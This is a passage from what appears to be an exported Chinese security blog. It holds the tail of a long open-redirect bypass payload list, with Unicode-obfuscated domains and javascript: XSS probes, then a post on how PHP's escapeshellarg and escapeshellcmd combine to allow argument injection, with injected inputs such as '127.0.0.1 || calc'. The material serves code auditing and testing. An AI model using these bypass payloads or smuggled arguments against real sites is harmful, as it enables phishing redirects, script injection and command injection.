class="bash">5cwww.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ</span></span><br><span class="line">https://%5cⓁ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ</span><br><span class="line">https://%5cwww.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ</span><br><span class="line">/https://%5cⓁ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ</span><br><span class="line">/https://%5cwww.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ</span><br><span class="line">https://Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ</span><br><span class="line">https://www.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ</span><br><span class="line">//Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ</span><br><span class="line">http:Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ</span><br><span class="line">https:Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ</span><br><span class="line">//Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ%E3%80%82pw</span><br><span class="line">\/\/Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/</span><br><span class="line">/\/Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/</span><br><span class="line">//\/Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/</span><br><span class="line">//Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ%00｡Ｐⓦ</span><br><span class="line">https://www.whitelisteddomain.tld/https://Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/</span><br><span class="line">〱Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ</span><br><span class="line">〵Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ</span><br><span class="line">ゝⓁ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ</span><br><span class="line">ーⓁ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ</span><br><span class="line">ｰⓁ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ</span><br><span class="line">/〱Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ</span><br><span class="line">/〵Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ</span><br><span class="line">/ゝⓁ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ</span><br><span class="line">/ーⓁ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ</span><br><span class="line">/ｰⓁ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ</span><br><span class="line">&lt;&gt;//Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ</span><br><span class="line">//Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ\@www.whitelisteddomain.tld</span><br><span class="line">https://:@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ\@www.whitelisteddomain.tld</span><br><span class="line">http://Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ:80#@www.whitelisteddomain.tld/</span><br><span class="line">http://Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ:80?@www.whitelisteddomain.tld/</span><br><span class="line">http://3H6k7lIAiqjfNeN@www.whitelisteddomain.tld+@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/</span><br><span class="line">http://3H6k7lIAiqjfNeN@www.whitelisteddomain.tld⁺@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/</span><br><span class="line">http://XY&gt;.7d8T\205pZM@www.whitelisteddomain.tld+@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/</span><br><span class="line">http://XY&gt;.7d8T\205pZM@www.whitelisteddomain.tld⁺@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/</span><br><span class="line">http://3H6k7lIAiqjfNeN@www.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/</span><br><span class="line">http://XY&gt;.7d8T\205pZM@www.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/</span><br><span class="line">http://www.whitelisteddomain.tld+&amp;@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ#+@www.whitelisteddomain.tld/</span><br><span class="line">http://www.whitelisteddomain.tld⁺&amp;@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ#⁺@www.whitelisteddomain.tld/</span><br><span class="line">http://Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ\twww.whitelisteddomain.tld/</span><br><span class="line">//Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ:80#@www.whitelisteddomain.tld/</span><br><span class="line">//Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ:80?@www.whitelisteddomain.tld/</span><br><span class="line">//3H6k7lIAiqjfNeN@www.whitelisteddomain.tld+@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/</span><br><span class="line">//3H6k7lIAiqjfNeN@www.whitelisteddomain.tld⁺@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/</span><br><span class="line"><span class="meta">//XY&gt;</span><span class="bash">.7d8T\205pZM@www.whitelisteddomain.tld+@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/</span></span><br><span class="line"><span class="meta">//XY&gt;</span><span class="bash">.7d8T\205pZM@www.whitelisteddomain.tld⁺@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/</span></span><br><span class="line">//3H6k7lIAiqjfNeN@www.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/</span><br><span class="line"><span class="meta">//XY&gt;</span><span class="bash">.7d8T\205pZM@www.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/</span></span><br><span class="line">//www.whitelisteddomain.tld+&amp;@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ#+@www.whitelisteddomain.tld/</span><br><span class="line">//www.whitelisteddomain.tld⁺&amp;@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ#⁺@www.whitelisteddomain.tld/</span><br><span class="line">//Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ\twww.whitelisteddomain.tld/</span><br><span class="line">//;@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ</span><br><span class="line">//﹔@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ</span><br><span class="line">http://;@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ</span><br><span class="line">http://﹔@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ</span><br><span class="line">@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ</span><br><span class="line">http://Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ%2f%2f.www.whitelisteddomain.tld/</span><br><span class="line">http://Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ%5c%5c.www.whitelisteddomain.tld/</span><br><span class="line">http://Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ%3F.www.whitelisteddomain.tld/</span><br><span class="line">http://Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ%23.www.whitelisteddomain.tld/</span><br><span class="line">http://www.whitelisteddomain.tld:80%40Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/</span><br><span class="line">http://www.whitelisteddomain.tld%2eⓁ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/</span><br><span class="line">/https:/%5cⓁ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/</span><br><span class="line">https:/%5cⓁ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/</span><br><span class="line">/http://Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ</span><br><span class="line"><span class="meta">/%</span><span class="bash">2f%2fⓁ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ</span></span><br><span class="line"><span class="meta">//%</span><span class="bash">2f%2fⓁ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ</span></span><br><span class="line">/Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e</span><br><span class="line">/http:/Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ</span><br><span class="line">http:/Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ</span><br><span class="line">/.Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ</span><br><span class="line">http://.Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ</span><br><span class="line">.Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ</span><br><span class="line">///\;@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ</span><br><span class="line">///\﹔@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ</span><br><span class="line">///Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ</span><br><span class="line">/////Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/</span><br><span class="line">/////Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ</span><br><span class="line">http://www.Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ\.www.whitelisteddomain.tld</span><br><span class="line"><span class="meta">%</span><span class="bash">01https://Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ</span></span><br><span class="line">www.whitelisteddomain.tld;@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ</span><br><span class="line">www.whitelisteddomain.tld﹔@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ</span><br><span class="line">https://www.whitelisteddomain.tld;@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ</span><br><span class="line">https://www.whitelisteddomain.tld﹔@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ</span><br><span class="line">http:%0a%0dⓁ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ</span><br><span class="line">https://%0a%0dⓁ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ</span><br><span class="line">Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/www.whitelisteddomain.tld</span><br><span class="line">https://Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/www.whitelisteddomain.tld</span><br><span class="line">//Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/www.whitelisteddomain.tld</span><br><span class="line">javascript:alert(document.domain)//://</span><br><span class="line"><span class="meta">/#</span><span class="bash">//localdomain.pw</span></span><br><span class="line"><span class="meta">#</span><span class="bash">//localdomain.pw</span></span><br><span class="line"><span class="meta">/#</span><span class="bash">//Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ</span></span><br><span class="line"><span class="meta">#</span><span class="bash">//Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ</span></span><br><span class="line"><span class="meta">https%</span><span class="bash">3A/localdomain.pw</span></span><br><span class="line"><span class="meta">https%</span><span class="bash">3A/Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ%2f%2f.www.whitelisteddomain.tld/</span></span><br><span class="line"><span class="meta">https%</span><span class="bash">3A/:@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ\@www.whitelisteddomain.tld</span></span><br><span class="line"><span class="meta">https%</span><span class="bash">3A/;@localdomain.pw</span></span><br><span class="line"><span class="meta">https%</span><span class="bash">3A/﹔@localdomain.pw</span></span><br><span class="line"><span class="meta">https%</span><span class="bash">3A/www.Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ\.www.whitelisteddomain.tld</span></span><br><span class="line">javascript:%250Aalert(1)</span><br><span class="line">javascript:alert(1)//https://www.whitelisteddomain.tld</span><br><span class="line">°/localdomain.pw</span><br><span class="line">°/Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ</span><br><span class="line">////localdomain。pw</span><br><span class="line">////Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ。Ｐⓦ</span><br><span class="line">//localdomain.pw?</span><br><span class="line">//Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ?</span><br><span class="line">//.@.@localdomain.pw</span><br><span class="line">//.@.@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ</span><br><span class="line">javascript:new%20Function`al\ert\`1\``;</span><br><span class="line"><span class="meta">%</span><span class="bash">09Jav%09ascript:alert(1)</span></span><br><span class="line">https://localdomain｡pw\ᵗwww.whitelisteddomain.tld</span><br><span class="line">//localdomain｡pw\ᵗwww.whitelisteddomain.tld</span><br><span class="line">https://www.whitelisteddomain.tld｡₨/</span><br><span class="line">//www.whitelisteddomain.tld｡₨/</span><br><span class="line">https://localdomain.pw\udfff@www.whitelisteddomain.tld/</span><br><span class="line">//localdomain.pw\udfff@www.whitelisteddomain.tld/</span><br><span class="line">https://localdomain.pw�@www.whitelisteddomain.tld/</span><br><span class="line">//localdomain.pw�@www.whitelisteddomain.tld/</span><br><span class="line">https://www.whitelisteddomain.tld%40%E2%80%AE@wp.niamodlacol</span><br><span class="line">https://www.whitelisteddomain.tld%40%E2%80%AE@localdomain.pw</span><br><span class="line">https://www.whitelisteddomain.tld%40%E2%80%AE@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ</span><br><span class="line">https://www.whitelisteddomain.tld@%E2%80%AE@wp.niamodlacol</span><br><span class="line">https://www.whitelisteddomain.tld@%E2%80%AE@localdomain.pw</span><br><span class="line">https://www.whitelisteddomain.tld@%E2%80%AE@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ</span><br><span class="line">https://www.whitelisteddomain.tld@/%E2%80%AE@wp.niamodlacol</span><br><span class="line">https://www.whitelisteddomain.tld@/%E2%80%AE@localdomain.pw</span><br><span class="line">https://www.whitelisteddomain.tld@/%E2%80%AE@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ</span><br><span class="line">https://www.whitelisteddomain.tld@'#localdomain.pw</span><br><span class="line">https://www.whitelisteddomain.tld@'#Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ</span><br><span class="line">javascript:alert(1)//localdomain.pw/</span><br><span class="line">javascript:alert(1)//www.whitelisteddomain.tld/</span><br><span class="line">Javascript://%E2%80%A9alert(618)</span><br><span class="line">https://www.whitelisteddomain.tld%09.localdomain.pw</span><br><span class="line">www.whitelisteddomain.tld%09.localdomain.pw</span><br><span class="line">https://www.whitelisteddomain.tld%09.Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ</span><br><span class="line">www.whitelisteddomain.tld%09.Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ</span><br><span class="line">https://www.whitelisteddomain.tld%09｡Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ</span><br><span class="line">www.whitelisteddomain.tld%09｡Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ</span><br><span class="line">https://www.whitelisteddomain.tld%252elocaldomain.pw</span><br><span class="line">www.whitelisteddomain.tld%252elocaldomain.pw</span><br><span class="line">https://www.whitelisteddomain.tld%252eⓁ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ</span><br><span class="line">www.whitelisteddomain.tld%252eⓁ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>URL重定向</tag>
      </tags>
  </entry>
  <entry>
    <title>escapeshellarg&amp;&amp;escapeshellcmd</title>
    <url>/2020/11/10/blog_formal/security/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/escapeshellarg&amp;&amp;escapeshellcmd/</url>
    <content><![CDATA[<h1 id="escapeshellarg-amp-amp-escapeshellcmd"><a href="#escapeshellarg-amp-amp-escapeshellcmd" class="headerlink" title="escapeshellarg&amp;&amp;escapeshellcmd"></a>escapeshellarg&amp;&amp;escapeshellcmd</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    php中，<code>escapeshellarg</code>和<code>escapeshellcmd</code>两个函数都是为了防止命令注入，处理参数，单独使用不会出现问题，但是如果在一定场景下，两个函数一起使用，由于特性原因，则会产生一定的安全问题</p>
<a id="more"></a>

<h2 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h2><p>​    在Linux系统中</p>
<ul>
<li>被单引号<code>&#39;&#39;</code>包裹的部分如果存在变量，变量不会被解析</li>
<li>被双引号<code>&quot;&quot;</code>包裹的部分在执行时，bash会先将变量名解析为变量的值再使用</li>
</ul>
<p>eg:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:/home/sangfor/mywork# echo 'whoami'</span><br><span class="line">whoami</span><br><span class="line">root@kali:/home/sangfor/mywork# echo "whoami"</span><br><span class="line">whoami</span><br><span class="line">root@kali:/home/sangfor/mywork# echo "`whoami`"</span><br><span class="line">root</span><br><span class="line">root@kali:/home/sangfor/mywork# echo '`whoami`'</span><br><span class="line">`whoami`</span><br></pre></td></tr></table></figure>

<h2 id="函数说明"><a href="#函数说明" class="headerlink" title="函数说明"></a>函数说明</h2><h3 id="escapeshellarg"><a href="#escapeshellarg" class="headerlink" title="escapeshellarg"></a>escapeshellarg</h3><ul>
<li><p>把字符串转码为可以在 shell 命令里使用的参数</p>
</li>
<li><p>将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数</p>
</li>
</ul>
<hr>
<ul>
<li>参数： 需要被转码的参数</li>
<li>返回值：转换之后字符串</li>
</ul>
<h3 id="escapeshellcmd"><a href="#escapeshellcmd" class="headerlink" title="escapeshellcmd"></a>escapeshellcmd</h3><ul>
<li><p>shell 元字符转义</p>
</li>
<li><p>对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 <code>exec()</code>或 <code>system()</code>函数，或者 <code>执行操作符</code>之前进行转义</p>
</li>
<li><p>反斜线<code>\</code>会在以下字符之前插入：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&amp;#;`|*?~&lt;&gt;^()[]&#123;&#125;$\, \x0A 和 \xFF</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>&#39;</code> 和 <code>&quot;</code> 仅在不配对儿的时候被转义</p>
</li>
<li><p>在 Windows 平台上，所有上述这些字符以及 <code>%</code> 和 <code>!</code> 字符都会被空格代替</p>
</li>
</ul>
<hr>
<ul>
<li>参数：command 要转义的命令</li>
<li>返回值：转换后字符串</li>
</ul>
<h3 id="代码例子"><a href="#代码例子" class="headerlink" title="代码例子"></a>代码例子</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// escapeshellarg.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $arg1 = <span class="string">"127.0.0.1 || calc"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"before: "</span>.$arg1;</span><br><span class="line">    <span class="keyword">echo</span> PHP_EOL;</span><br><span class="line">    $arg1_res = escapeshellarg($arg1);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"after: "</span>.$arg1_res;</span><br><span class="line">    <span class="keyword">echo</span> PHP_EOL;</span><br><span class="line"></span><br><span class="line">    $arg2 = <span class="string">"127.0.0.1' || calc"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"before: "</span>.$arg2;</span><br><span class="line">    <span class="keyword">echo</span> PHP_EOL;</span><br><span class="line">    $arg2_res = escapeshellarg($arg2);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"after: "</span>.$arg2_res;</span><br><span class="line">    <span class="keyword">echo</span> PHP_EOL;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">    root@kali:/home/sangfor/mywork<span class="comment"># php escapeshellarg.php</span></span><br><span class="line">    before: <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> || calc</span><br><span class="line">    after: <span class="string">'127.0.0.1 || calc'</span></span><br><span class="line">    before: <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="string">' || calc</span></span><br><span class="line"><span class="string">    after: '</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="string">'\''</span> || calc<span class="string">'</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// escapeshellcmd.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $arg1 = <span class="string">"127.0.0.1 || calc"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"before: "</span>.$arg1;</span><br><span class="line">    <span class="keyword">echo</span> PHP_EOL;</span><br><span class="line">    $arg1_res = escapeshellcmd($arg1);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"after: "</span>.$arg1_res;</span><br><span class="line">    <span class="keyword">echo</span> PHP_EOL;</span><br><span class="line"></span><br><span class="line">    $arg2 = <span class="string">"127.0.0.1' || calc"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"before: "</span>.$arg2;</span><br><span class="line">    <span class="keyword">echo</span> PHP_EOL;</span><br><span class="line">    $arg2_res = escapeshellcmd($arg2);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"after: "</span>.$arg2_res;</span><br><span class="line">    <span class="keyword">echo</span> PHP_EOL;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">    root@kali:/home/sangfor/mywork<span class="comment"># php escapeshellcmd.php</span></span><br><span class="line">    before: <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> || calc</span><br><span class="line">    after: <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> \|\| calc</span><br><span class="line">    before: <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="string">' || calc</span></span><br><span class="line"><span class="string">    after: 127.0.0.1\' \|\| calc</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// argcmd.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $arg1 = <span class="string">"127.0.0.1 -v -d a=1"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"before: "</span>.$arg1;</span><br><span class="line">    <span class="keyword">echo</span> PHP_EOL;</span><br><span class="line">    $arg1_mid = escapeshellarg($arg1);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"mid: "</span>.$arg1_mid;</span><br><span class="line">    <span class="keyword">echo</span> PHP_EOL;</span><br><span class="line">    $arg1_res = escapeshellcmd($arg1_mid);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"after: "</span>.$arg1_res;</span><br><span class="line">    <span class="keyword">echo</span> PHP_EOL;</span><br><span class="line"></span><br><span class="line">    $arg2 = <span class="string">"127.0.0.1 ' -v -d a=1"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"before: "</span>.$arg2;</span><br><span class="line">    <span class="keyword">echo</span> PHP_EOL;</span><br><span class="line">    $arg2_mid = escapeshellarg($arg2);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"mid: "</span>.$arg2_mid;</span><br><span class="line">    <span class="keyword">echo</span> PHP_EOL;</span><br><span class="line">    $arg2_res = escapeshellcmd($arg2_mid);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"after: "</span>.$arg2_res;</span><br><span class="line">    <span class="keyword">echo</span> PHP_EOL;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">    root@kali:/home/sangfor/mywork<span class="comment"># php argcmd.php</span></span><br><span class="line">    before: <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> -v -d a=<span class="number">1</span></span><br><span class="line">    mid: <span class="string">'127.0.0.1 -v -d a=1'</span></span><br><span class="line">    after: <span class="string">'127.0.0.1 -v -d a=1'</span></span><br><span class="line">    before: <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="string">' -v -d a=1</span></span><br><span class="line"><span class="string">    mid: '</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="string">'\''</span> -v -d a=<span class="number">1</span><span class="string">'</span></span><br><span class="line"><span class="string">    after: '</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="string">'\\'</span><span class="string">' -v -d a=1\'</span></span><br><span class="line"><span class="string">    root@kali:/home/sangfor/mywork# curl '</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> -v -d a=<span class="number">1</span><span class="string">'</span></span><br><span class="line"><span class="string">    curl: (3) URL using bad/illegal format or missing URL</span></span><br><span class="line"><span class="string">    root@kali:/home/sangfor/mywork# curl '</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="string">'\\'</span><span class="string">' -v -d a=1\'</span></span><br><span class="line"><span class="string">    * Closing connection -1</span></span><br><span class="line"><span class="string">    curl: (3) URL using bad/illegal format or missing URL</span></span><br><span class="line"><span class="string"># 参数逃逸</span></span><br></pre></td></tr></table></figure>

